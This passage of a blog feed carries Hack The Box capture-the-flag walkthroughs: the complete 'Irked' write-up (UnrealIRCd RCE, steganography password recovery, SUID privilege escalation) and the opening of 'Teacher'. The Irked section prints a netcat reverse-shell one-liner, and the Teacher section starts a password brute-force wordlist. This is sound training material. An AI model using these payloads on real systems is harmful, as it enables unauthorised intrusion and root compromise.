================================================================================</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/bighead/0.png" /></entry><entry><title type="html">Hack The Box - Irked</title><link href="http://localhost:4000/hack-the-box/irked/" rel="alternate" type="text/html" title="Hack The Box - Irked" /><published>2019-04-27T00:00:00+02:00</published><updated>2019-04-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/irked</id><content type="html" xml:base="http://localhost:4000/hack-the-box/irked/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-today-irked-retired-and-heres-my-write-up-about-it-it-was-an-easy-straightforward-machine-no-rabbit-holes-and-such-things-to-get-an-initial-shell-on-the-box-we-will-exploit-an-rce-vulnerable-irc-server-called-unrealircd-after-getting-a-shell-we-will-find-a-backup-file-which-has-a-password-we-will-use-that-password-to-get-a-hidden-text-file-from-an-image-steg-that-text-file-contains-another-password-which-we-will-use-to-get-ssh-access-as-another-user-finally-for-privilege-escalation-there-is-an-suid-binary-that-executes-a-file-and-we-control-that-file-so-we-can-get-a-reverse-shell-as-root-its-a-linux-box-and-its-ip-is-101010117-i-added-it-to-etchosts-as-irkedhtb-lets-jump-right-in-&quot;&gt;Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called &lt;code class=&quot;highlighter-rouge&quot;&gt;UnrealIRCd&lt;/code&gt;. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.117&lt;/code&gt;. I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;irked.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC irked.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;there-is-ssh-running-on-port-22-and-http-running-on-port-80-lets-take-a-look-at-http&quot;&gt;There is ssh running on port 22 and http running on port 80. Let’s take a look at http.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;there-is-only-that-image-and-a-message-saying--irc-is-almost-working-source-also-has-nothing-interesting-&quot;&gt;There is only that image and a message saying : &lt;code class=&quot;highlighter-rouge&quot;&gt;IRC is almost working!&lt;/code&gt;, Source also has nothing interesting :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-have-a-hint-which-is-irc-lets-check-that-if-we-didnt-find-anything-then-we-will-continue-with-http&quot;&gt;We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;irc&quot;&gt;IRC&lt;/h3&gt;
-&lt;h4 id=&quot;i-searched-for-irc-and-found-here-that-if-there-is-an-irc-server-running-on-the-machine-then-probably-it-will-be-in-the-port-range-from-6000-to-7000-so-i-ran-another-nmap-scan-&quot;&gt;I searched for irc and found &lt;a href=&quot;https://en.wikipedia.org/wiki/Internet_Relay_Chat#Technical_information&quot;&gt;here&lt;/a&gt; That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 6000-7000 -sV -sT -sC irked.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;there-is-an-irc-server-running-on-port-6697-called-unrealircd-there-are-some-known-vulnerabilities-for-unrealircd-one-of-them-is-a-remote-code-execution-and-there-is-a-metasploit-module-for-it-&quot;&gt;There is an irc server running on port 6697 called &lt;code class=&quot;highlighter-rouge&quot;&gt;UnrealIRCd&lt;/code&gt;. There are some known vulnerabilities for &lt;code class=&quot;highlighter-rouge&quot;&gt;UnrealIRCd&lt;/code&gt;, One of them is a Remote Code Execution and there is a metasploit module for it :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-check-if-the-server-is-vulnerable-to-it&quot;&gt;Let’s check if the server is vulnerable to it.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/6.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/irked/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-worked-and-we-got-a-shell-as-ircd-&quot;&gt;It worked and we got a shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;ircd&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;steg-in-irkedjpg-ssh-as-djmardov&quot;&gt;Steg in &lt;code class=&quot;highlighter-rouge&quot;&gt;irked.jpg&lt;/code&gt;, SSH as &lt;code class=&quot;highlighter-rouge&quot;&gt;djmardov&lt;/code&gt;&lt;/h3&gt;
-&lt;h4 id=&quot;there-are-two-users-on-the-box--ircd-and-djmardov-i-checked-homeircd-and-there-was-nothing-interesting-in-homedjmardov-i-didnt-find-usertxt-&quot;&gt;There are two users on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;ircd&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;djmardov&lt;/code&gt;. I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/ircd&lt;/code&gt; and there was nothing interesting. In &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/djmardov&lt;/code&gt; I didn’t find &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-tried-to-go-into-ssh-but-i-got-permission-denied-&quot;&gt;I tried to go into &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; but I got &lt;code class=&quot;highlighter-rouge&quot;&gt;Permission denied&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-checked-other-directories-like-desktop-downloads-documents-etc-and-in-documents-i-found-usertxt-and-a-file-called-backup-&quot;&gt;I checked other directories like &lt;code class=&quot;highlighter-rouge&quot;&gt;Desktop&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Downloads&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;Documents&lt;/code&gt; etc… And in &lt;code class=&quot;highlighter-rouge&quot;&gt;Documents&lt;/code&gt; I found &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; and a file called &lt;code class=&quot;highlighter-rouge&quot;&gt;.backup&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/11.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;cat .backup&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Super elite steg backup pw
-UPupDOWNdownLRlrBAbaSSss
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;it-gives-us-a-hint-about-some-steg-backup-we-also-get-something-that-looks-like-a-password--upupdowndownlrlrbabassss-but-where-will-we-use-that-password--remember-the-image-we-saw-earlier-on-that-apache-server-&quot;&gt;It gives us a hint about some steg backup, we also get something that looks like a password : &lt;code class=&quot;highlighter-rouge&quot;&gt;UPupDOWNdownLRlrBAbaSSss&lt;/code&gt;. But where will we use that password ? Remember the image we saw earlier on that apache server ?&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/2.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/irked/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-downloaded-it-then-used-steghide-to-check-if-there-is-any-hidden-file&quot;&gt;I downloaded it then used &lt;code class=&quot;highlighter-rouge&quot;&gt;steghide&lt;/code&gt; to check if there is any hidden file.&lt;/h4&gt;
-&lt;h4 id=&quot;note--i-have-a-list-for-some-steganography-tools-if-you-are-not-familiar-with-steg-you-can-check-it-here&quot;&gt;Note : I have a list for some steganography tools, If you are not familiar with steg you can check it &lt;a href=&quot;/lists/stego&quot;&gt;here&lt;/a&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://irked.htb/irked.jpg&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/13.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;steghide info irked.jpg&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;there-is-a-hidden-text-file-called-passtxt-lets-extract-it-&quot;&gt;There is a hidden text file called &lt;code class=&quot;highlighter-rouge&quot;&gt;pass.txt&lt;/code&gt;, Let’s extract it :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;steghide extract -sf irked.jpg&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/15.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;cat pass.txt&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-the-password--kab6hmbbp2jhg-lets-try-to-login-as-djmardov-&quot;&gt;We got the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;Kab6h+m+bbp2J:HG&lt;/code&gt;, let’s try to login as &lt;code class=&quot;highlighter-rouge&quot;&gt;djmardov&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;exploiting-viewuser-privilege-escalation-to-root&quot;&gt;Exploiting &lt;code class=&quot;highlighter-rouge&quot;&gt;viewuser&lt;/code&gt;, Privilege Escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/h3&gt;
-&lt;h4 id=&quot;after-some-enumeration-i-searched-for-suid-binaries-and-in-usrbin-i-found-a-binary-called-viewuser&quot;&gt;After some enumeration, I searched for &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt; binaries and in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin&lt;/code&gt; I found a binary called &lt;code class=&quot;highlighter-rouge&quot;&gt;viewuser&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;find /usr/bin/ -perm -4000&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-seems-interesting-so-i-decided-to-check-it&quot;&gt;It seems interesting so I decided to check it.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;viewuser&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-shows-logged-in-users-but-we-dont-care-about-that-the-only-thing-we-care-about-is-the-last-line--tmplistusers-1-tmplistusers-djmardov-not-found-it-seems-like-it-was-trying-to-do-something-with-the-file-tmplistusers-which-doesnt-exist-i-downloaded-viewuser-to-try-some-stuff-&quot;&gt;It shows logged in users, but we don’t care about that. The only thing we care about is the last line : &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers: 1: /tmp/listusers: djmardov: not found&lt;/code&gt;. It seems like it was trying to do something with the file &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers&lt;/code&gt; which doesn’t exist. I downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;viewuser&lt;/code&gt; to try some stuff :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scp djmardov@irked.htb:/usr/bin/viewuser ./&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;when-i-did-ltrace-on-the-binary-i-found-that-it-executes-tmplistusers-&quot;&gt;When I did &lt;code class=&quot;highlighter-rouge&quot;&gt;ltrace&lt;/code&gt; on the binary I found that it executes &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-since-this-binary-runs-as-root-then-it-also-executes-tmplistusers-as-root-so-we-can-simply-get-a-reverse-shell-by-putting-the-payload-in-tmplistusers-then-after-running-the-binary-again-it-should-execute-the-payload&quot;&gt;And since this binary runs as root, then it also executes &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers&lt;/code&gt; as root. So we can simply get a reverse shell by putting the payload in &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp/listusers&lt;/code&gt;, Then after running the binary again it should execute the payload.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f&quot; &amp;gt; /tmp/listusers&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/irked/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;everything-is-fine-lets-check-our-listener-&quot;&gt;Everything is fine, let’s check our listener :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/irked/23.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/irked/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-own-root-&quot;&gt;Now we own root !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---teacher&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/teacher/&quot;&gt;Hack The Box - Teacher&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---bighead&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/bighead/&quot;&gt;Hack The Box - BigHead&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Steganography" /><category term="Web" /><category term="ssh" /><category term="Reverse Engineering" /><category term="Binary Exploitation" /><summary type="html">Quick Summary Hey guys, today Irked retired and here’s my write-up about it. It was an easy straightforward machine, no rabbit holes and such things. To get an initial shell on the box we will exploit an RCE vulnerable irc server called UnrealIRCd. After getting a shell we will find a backup file which has a password. We will use that password to get a hidden text file from an image (steg). That text file contains another password which we will use to get ssh access as another user. Finally for privilege escalation there is an suid binary that executes a file, and we control that file so we can get a reverse shell as root. It’s a linux box and its ip is 10.10.10.117. I added it to /etc/hosts as irked.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC irked.htb There is ssh running on port 22 and http running on port 80. Let’s take a look at http. HTTP Initial Enumeration There is only that image and a message saying : IRC is almost working!, Source also has nothing interesting : We have a hint which is irc, let’s check that. If we didn’t find anything then we will continue with http. IRC I searched for irc and found here That if there is an irc server running on the machine, then probably it will be in the port range from 6000 to 7000. So I ran another nmap scan : nmap -p 6000-7000 -sV -sT -sC irked.htb There is an irc server running on port 6697 called UnrealIRCd. There are some known vulnerabilities for UnrealIRCd, One of them is a Remote Code Execution and there is a metasploit module for it : Let’s check if the server is vulnerable to it. It worked and we got a shell as ircd : Steg in irked.jpg, SSH as djmardov There are two users on the box : ircd and djmardov. I checked /home/ircd and there was nothing interesting. In /home/djmardov I didn’t find user.txt : I tried to go into .ssh but I got Permission denied : I checked other directories like Desktop, Downloads, Documents etc… And in Documents I found user.txt and a file called .backup : cat .backup Super elite steg backup pw UPupDOWNdownLRlrBAbaSSss It gives us a hint about some steg backup, we also get something that looks like a password : UPupDOWNdownLRlrBAbaSSss. But where will we use that password ? Remember the image we saw earlier on that apache server ? I downloaded it then used steghide to check if there is any hidden file. Note : I have a list for some steganography tools, If you are not familiar with steg you can check it here. wget http://irked.htb/irked.jpg steghide info irked.jpg There is a hidden text file called pass.txt, Let’s extract it : steghide extract -sf irked.jpg cat pass.txt We got the password : Kab6h+m+bbp2J:HG, let’s try to login as djmardov : We owned user ! Exploiting viewuser, Privilege Escalation to root After some enumeration, I searched for suid binaries and in /usr/bin I found a binary called viewuser. find /usr/bin/ -perm -4000 It seems interesting so I decided to check it. viewuser It shows logged in users, but we don’t care about that. The only thing we care about is the last line : /tmp/listusers: 1: /tmp/listusers: djmardov: not found. It seems like it was trying to do something with the file /tmp/listusers which doesn’t exist. I downloaded viewuser to try some stuff : scp djmardov@irked.htb:/usr/bin/viewuser ./ When I did ltrace on the binary I found that it executes /tmp/listusers : And since this binary runs as root, then it also executes /tmp/listusers as root. So we can simply get a reverse shell by putting the payload in /tmp/listusers, Then after running the binary again it should execute the payload. echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc ip port &amp;gt;/tmp/f&quot; &amp;gt; /tmp/listusers Everything is fine, let’s check our listener : Now we own root ! That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Teacher Next Hack The Box write-up : Hack The Box - BigHead</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/irked/0.png" /></entry><entry><title type="html">Hack The Box - Teacher</title><link href="http://localhost:4000/hack-the-box/teacher/" rel="alternate" type="text/html" title="Hack The Box - Teacher" /><published>2019-04-20T00:00:00+02:00</published><updated>2019-04-20T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/teacher</id><content type="html" xml:base="http://localhost:4000/hack-the-box/teacher/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys--today-teacher-retired-and-here-is-my-write-up-about-it-i-dont-have-too-much-to-say-about-this-box-it-was-an-easy-regular-machine--we-will-exploit-an-authenticated-remote-code-execution-in-a-vulnerable-version-of-a-web-application-called-moodle-to-get-an-initial-shell-on-the-box-and-for-privilege-escalation-we-will-find-a-directory-which-permissions-are-set-to-read--write-and-execute-by-anyone--and-from-there-we-can-create-a-symlink-to-root-or-anything-else-we-want-to-access-its-a-linux-box-and-its-ip-is-101010153-i-added-it-to-etchosts-as-teacherhtb-lets-jump-right-in-&quot;&gt;Hey guys , today Teacher retired and here is my write-up about it. I don’t have too much to say about this box. It was an easy regular machine , We will exploit an authenticated remote code execution in a vulnerable version of a web application called moodle to get an initial shell on the box. And for privilege escalation we will find a directory which permissions are set to read , write and execute by anyone , and from there we can create a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; or anything else we want to access. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.153&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;teacher.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with nmap to scan for open ports and services :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC teacher.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-only-see-http-running-on-port-80-lets-see-whats-in-there&quot;&gt;We only see http running on port 80. Let’s see what’s in there.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;there-is-just-a-static-website-titled-blackhat-highschool--i-looked-into-other-pages-like-courses--students-etc-and-also-checked-their-source-code-and-on-gallery-&quot;&gt;There is just a static website titled &lt;code class=&quot;highlighter-rouge&quot;&gt;Blackhat highschool&lt;/code&gt; , I looked into other pages like &lt;code class=&quot;highlighter-rouge&quot;&gt;Courses&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;Students&lt;/code&gt; etc… And also checked their source code. And on &lt;code class=&quot;highlighter-rouge&quot;&gt;Gallery&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-found-this-line-in-the-source-&quot;&gt;I found this line in the source :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;for-img-srcimages5png-there-is-an-onerror-attribute-to-print-thats-an-f-in-the-console-so-i-checked-the-console-&quot;&gt;for &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;img src=&quot;images/5.png&quot;&amp;gt;&lt;/code&gt; there is an &lt;code class=&quot;highlighter-rouge&quot;&gt;onerror&lt;/code&gt; attribute to print &lt;code class=&quot;highlighter-rouge&quot;&gt;That's an F&lt;/code&gt; in the console. So I checked the console :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;weird-lets-check-that-image-httpteacherhtbimages5png-&quot;&gt;Weird let’s check that image. &lt;code class=&quot;highlighter-rouge&quot;&gt;http://teacher.htb/images/5.png&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;corrupted-file--lets-check-if-its-really-a-corrupted-image-or-its-not-an-image-at-all-&quot;&gt;Corrupted file ? Let’s check if it’s really a corrupted image or it’s not an image at all :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;curl http://teacher.htb/images/5.png&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hi Servicedesk,
-
-I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.                                                 
-
-Could you guys figure out what the last charachter is, or just reset it?                                                                   
-
-Thanks,
-Giovanni
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;nice--we-have-a-username-and-a-password-but-we-still-need-to-figure-out-the-last-character-but-where-will-we-use-these-credentials-anyway--i-ran-gobuster-with-usrsharewordlistsdirbusterdirectory-list-23-mediumtxt-in-the-background-and-got-some-results--one-of-them-was-moodle&quot;&gt;Nice , we have a username and a password but we still need to figure out the last character. But where will we use these credentials anyway ? I ran gobuster with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt; in the background and got some results , one of them was &lt;code class=&quot;highlighter-rouge&quot;&gt;/moodle&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://teacher.htb/moodle&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/teacher/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;Moodle is a free and open-source learning management system written in PHP and distributed under the GNU General Public License  -&lt;a href=&quot;https://en.wikipedia.org/wiki/Moodle&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h4 id=&quot;on-the-login-page-theres-a-guest-login-&quot;&gt;On the login page there’s a guest login :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/teacher/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;however-i-couldnt-achieve-anything-from-that-guest-login&quot;&gt;However I couldn’t achieve anything from that guest login.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;bruteforcing-the-last-character&quot;&gt;Bruteforcing the last character&lt;/h3&gt;
-&lt;h4 id=&quot;we-have-the-credentials-but-we-need-to-figure-out-the-last-character-of-the-password-i-created-a-list-of-numbers--letters-and-special-chars-and-printed-them-next-to-the-password&quot;&gt;We have the credentials but we need to figure out the last character of the password. I created a list of numbers , letters and special chars and printed them next to the password.&lt;/h4&gt;
-&lt;h4 id=&quot;for-i-in-az-do-echo-th4c00ltheachai-done--listtxt-this-will-print-all-the-letters-next-to-th4c00ltheacha&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;for i in {a..z}; do echo Th4C00lTheacha$i; done &amp;gt; list.txt&lt;/code&gt; this will print all the letters next to &lt;code class=&quot;highlighter-rouge&quot;&gt;Th4C00lTheacha&lt;/code&gt;&lt;/h4&gt;
